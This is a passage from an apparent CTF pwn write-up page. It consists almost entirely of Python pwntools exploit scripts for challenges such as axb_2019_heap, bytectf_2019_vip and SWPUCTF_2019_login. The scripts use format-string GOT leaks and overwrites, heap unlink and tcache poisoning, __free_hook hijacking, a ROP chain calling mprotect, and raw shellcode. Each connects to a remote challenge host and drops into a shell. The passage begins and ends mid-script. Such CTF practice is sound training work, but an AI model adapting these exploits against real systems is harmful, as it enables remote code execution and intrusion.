class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">##coding=utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">ip = "47.108.135.45"</span><br><span class="line">port = 20023</span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">lib = ELF("libc.so.6")</span><br><span class="line">'''</span><br><span class="line">0x3a80c execve("/bin/sh", esp+0x28, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x28] == NULL</span><br><span class="line">0x3a80e execve("/bin/sh", esp+0x2c, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x2c] == NULL</span><br><span class="line">0x3a812 execve("/bin/sh", esp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x30] == NULL</span><br><span class="line">0x3a819 execve("/bin/sh", esp+0x34, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x34] == NULL</span><br><span class="line">0x5f065 execl("/bin/sh", eax)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  eax == NULL</span><br><span class="line">0x5f066 execl("/bin/sh", [esp])</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp] == NULL</span><br><span class="line">'''</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A014))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">printf_got = u32(sh.recv(4))</span><br><span class="line">libc = printf_got - 0x049020</span><br><span class="line">system = libc + 0x03a940</span><br><span class="line">free = libc + lib.symbols['free']</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A014 + 4 * 5))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">__libc_start_main = u32(sh.recv(4))</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A030))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">sprintf = u32(sh.recv(4))</span><br><span class="line">one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]</span><br><span class="line">log.success("sprintf: " + hex(sprintf))</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("printf: " + hex(printf_got))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">payload  ='aaaaa'</span><br><span class="line">payload += fmtstr_payload(9,{0x804A014:one_gadget[0] + libc},write_size = "byte",numbwritten = 0xe)</span><br><span class="line">sh.sendlineafter("me:",payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x71-axb-2019-heap"><a href="#0x71-axb-2019-heap" class="headerlink" title="0x71 axb_2019_heap"></a>0x71 axb_2019_heap</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn1")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./pwn1")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">	pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line">	pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line">	def add(idx,size,content):</span><br><span class="line">		sh.sendlineafter(":","1")</span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">		sh.sendlineafter(":",str(size))</span><br><span class="line">		sh.sendlineafter(":",content)</span><br><span class="line">	def edit(idx,content):</span><br><span class="line">		sh.sendlineafter(":","4")</span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">		sh.sendlineafter(":",content)</span><br><span class="line">	def free(idx):</span><br><span class="line">		sh.sendlineafter(":","2")</span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">	chunk_list = 0x202060</span><br><span class="line">	payload = '%14$pAA%2$pB'</span><br><span class="line">	sh.sendlineafter(":",payload)</span><br><span class="line">	sh.recvuntil("Hello, ")</span><br><span class="line">	pie = int(sh.recvuntil("AA",True),16) - (0x55d7eaef1200 - 0x55d7eaef0000)</span><br><span class="line">	libc = int(sh.recvuntil("B",True),16) - lib.symbols['__malloc_initialize_hook'] + 0x30</span><br><span class="line">	__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	add(0,0x88,'\x11' * 0x87)</span><br><span class="line">	add(1,0xF8,'\x12' * 0xF7)</span><br><span class="line">	add(2,0x18,'\x13' * 0x17)</span><br><span class="line">	free(0)</span><br><span class="line">	payload = p64(0) + p64(0x81) + p64(pie + chunk_list - 0x18) + p64(pie + chunk_list - 0x10)</span><br><span class="line">	payload = payload.ljust(0x80,'\x00')</span><br><span class="line">	payload += p64(0x80)</span><br><span class="line">	add(0,0x88,payload)</span><br><span class="line">	free(1)</span><br><span class="line">	payload = p64(0) * 3 + p64(__free_hook - 8) + p64(0x100)</span><br><span class="line">	payload += p64(__free_hook - 8) + p64(0x100)</span><br><span class="line">	edit(0,payload)</span><br><span class="line">	edit(0,'/bin/sh\x00' + p64(system))</span><br><span class="line">	free(0)</span><br><span class="line">        log.success("pie: " + hex(pie))</span><br><span class="line">        log.success("libc: " + hex(libc))</span><br><span class="line">        log.success("chunk_list: " + hex(pie + chunk_list))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",28825,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x72-axb-2019-fmt64"><a href="#0x72-axb-2019-fmt64" class="headerlink" title="0x72 axb_2019_fmt64"></a>0x72 axb_2019_fmt64</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">ip = "47.108.135.45"</span><br><span class="line">port = 20023</span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">lib = ELF("libc.so.6")</span><br><span class="line">sprintf_got = 0x601058</span><br><span class="line">payload = '%9$sAAAA' + p64(sprintf_got)</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">sprintf = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">libc = sprintf - lib.symbols['sprintf']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">system = libc + one_gadget[0]</span><br><span class="line">payload = ''</span><br><span class="line">payload += '%' + str((system % 0x10000) - 9) + 'c%12$hn'</span><br><span class="line">payload += '%' + str(((system >> 16) % 0x10000) - (system % 0x10000)) + 'c%13$hn'</span><br><span class="line">payload += '%12$s'</span><br><span class="line">payload = payload.ljust(0x20,'\x00')</span><br><span class="line">payload += p64(sprintf_got) + p64(sprintf_got + 2)</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x73-bytectf-2019-vip"><a href="#0x73-bytectf-2019-vip" class="headerlink" title="0x73 bytectf_2019_vip"></a>0x73 bytectf_2019_vip</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("vip")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def vip():</span><br><span class="line">    sh.sendlineafter(":","6")</span><br><span class="line">    sh.sendafter(':',flat('a'*0x20, </span><br><span class="line">    0x0000000000000020, 0x0000010101000015, </span><br><span class="line">    0x0005000000000006, 0x7fff000000000006,))</span><br><span class="line">def add(idx):</span><br><span class="line">    sh.recvuntil("Your choice:")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.sendlineafter("Your choice:","3")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter("Your choice:","2")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">    sh.recvuntil("Your choice:")</span><br><span class="line">    sh.sendline("4")</span><br><span class="line">    sh.recvuntil(":")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.sendlineafter(":",str(size))</span><br><span class="line">    sh.recvuntil("Content:")</span><br><span class="line">    sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./vip")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("libc-2.27.so")</span><br><span class="line">    chunk_list = 0x404100</span><br><span class="line">    vip()</span><br><span class="line">    add(0)</span><br><span class="line">    add(1)</span><br><span class="line">    add(5)</span><br><span class="line">    add(6)</span><br><span class="line">    add(10)</span><br><span class="line">    free(6)</span><br><span class="line">    free(1)</span><br><span class="line">    payload = 'a' * 0x50 + p64(0) + p64(0x61) + p64(elf.got['free'])</span><br><span class="line">    edit(0,0x70,payload)</span><br><span class="line">    add(1)</span><br><span class="line">    add(2)</span><br><span class="line">    show(2)</span><br><span class="line">    free_addr = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00'))</span><br><span class="line">    libc = free_addr - lib.symbols['free']</span><br><span class="line">    system = libc + lib.symbols['system']</span><br><span class="line">    execve = libc + lib.symbols['execve']</span><br><span class="line">    printf = libc + lib.symbols['printf']</span><br><span class="line">    mprotect = libc + lib.symbols['mprotect']</span><br><span class="line">    edit(2,9,p64(printf))</span><br><span class="line">    edit(10,8,"%8$p\x00")</span><br><span class="line">    free(10)</span><br><span class="line">    sh.recvuntil("0x")</span><br><span class="line">    stack = int(sh.recvuntil("Done!",True),16) - 8 * 13</span><br><span class="line">    payload  = p64(libc + lib.symbols['free'])</span><br><span class="line">    payload += p64(libc + lib.symbols['puts'])</span><br><span class="line">    payload += p64(libc + lib.symbols['__stack_chk_fail'])</span><br><span class="line">    payload += p64(libc + lib.symbols['printf'])</span><br><span class="line">    payload += p64(libc + lib.symbols['memset'])</span><br><span class="line">    payload += p64(libc + lib.symbols['read'])</span><br><span class="line">    payload += p64(libc + lib.symbols['prctl'])</span><br><span class="line">    payload += p64(libc + lib.symbols['malloc'])</span><br><span class="line">    payload += p64(libc + lib.symbols['setvbuf'])</span><br><span class="line">    payload += p64(libc + lib.symbols['open'])</span><br><span class="line">    payload += p64(libc + lib.symbols['perror'])</span><br><span class="line">    payload += p64(libc + lib.symbols['atoi'])</span><br><span class="line">    payload += p64(libc + lib.symbols['scanf'])</span><br><span class="line">    payload += p64(libc + lib.symbols['exit'])</span><br><span class="line">    payload = payload.ljust(0x4040a0 - 0x404018,'\x00')</span><br><span class="line">    payload += p64(libc + lib.symbols['_IO_2_1_stdout_']) + p64(0)</span><br><span class="line">    payload += p64(libc + lib.symbols['_IO_2_1_stdin_']) + p64(0)</span><br><span class="line">    payload += p64(libc + lib.symbols['_IO_2_1_stderr_'])</span><br><span class="line">    payload += p64(0) * 7</span><br><span class="line">    payload += p64(stack)</span><br><span class="line">    edit(2,0x500,payload)</span><br><span class="line">    pop_rdx_ret = 0x1b96 + libc</span><br><span class="line">    pop_rdi_ret = 0x4018fb</span><br><span class="line">    pop_rsi_r15_ret = 0x4018f9</span><br><span class="line">    base = 0x404000</span><br><span class="line">    payload = p64(pop_rdi_ret) + p64(base)</span><br><span class="line">    payload += p64(pop_rsi_r15_ret) + p64(0x1000) + p64(0)</span><br><span class="line">    payload += p64(pop_rdx_ret) + p64(7)</span><br><span class="line">    payload += p64(mprotect)</span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(0)</span><br><span class="line">    payload += p64(pop_rsi_r15_ret) + p64(base + 0x800) + p64(0)</span><br><span class="line">    payload += p64(pop_rdx_ret) + p64(0x500)</span><br><span class="line">    payload += p64(libc + lib.symbols['read'])</span><br><span class="line">    payload += p64(base + 0x800)</span><br><span class="line">    edit(0,0x500,payload)</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    payload = 'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x03_j@Z\xbe\x01\x01\x01\x01\x81\xf6\xa1AA\x01\x0f\x05j\x01_j@Z\xbe\x01\x01\x01\x01\x81\xf6\xa1AA\x01j\x01X\x0f\x05'</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    log.success("stack: " + hex(stack))</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        log.success("pid: " + str(sh.pid))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node3.buuoj.cn",25165,0)</span><br></pre></td></tr></tbody></table></figure></div>
<h2 id="0x74-SWPUCTF-2019-login"><a href="#0x74-SWPUCTF-2019-login" class="headerlink" title="0x74 SWPUCTF_2019_login"></a>0x74 SWPUCTF_2019_login</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from printf_buf_not_in_stack import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("login")</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    sh = null</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./login")</span><br><span class="line">        lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("libc-2.27.so")</span><br><span class="line">    sh.sendlineafter(":","a")</span><br><span class="line">    payload = '%6$pAA%15$pBB\x00'</span><br><span class="line">    sh.sendlineafter(":",payload)</span><br><span class="line">    sh.recvuntil("0x")</span><br><span class="line">    ebp = int(sh.recvuntil("AA",True),16)</span><br><span class="line">    target_addr = ebp - (0xffe54918 - 0xffe5490c)</span><br><span class="line">    libc = int(sh.recvuntil("BB",True),16) - lib.symbols['__libc_start_main'] - 241</span><br><span class="line">    system = libc + lib.symbols['system']</span><br><span class="line">    binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">    def inputMsg(msg):</span><br><span class="line">        sh.sendlineafter("!",msg)</span><br><span class="line">    ebp1_offset = 6</span><br><span class="line">    ebp2_offset = 10</span><br><span class="line">    written_size = 0</span><br><span class="line">    offset = 0</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = 0x8d29</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 2</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = 0x804</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 16</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = system % 0x10000</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 18</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = system >> 16</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 20</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = 0xbeef</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 22</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = 0xdead</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 24</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = binsh % 0x10000</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 26</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = binsh >> 16</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    inputMsg("wllmmllw")</span><br><span class="line">    print getCode("inputMsg")</span><br><span class="line">    log.success("ebp: " + hex(ebp))</span><br><span class="line">    log.success("target_addr: " + hex(target_addr))</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    log.success("binsh: " + hex(binsh))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node3.buuoj.cn",28300,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x75-SWPUCTF-2019-p1KkHeap"><a href="#0x75-SWPUCTF-2019-p1KkHeap" class="headerlink" title="0x75 SWPUCTF_2019_p1KkHeap"></a>0x75 SWPUCTF_2019_p1KkHeap</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = 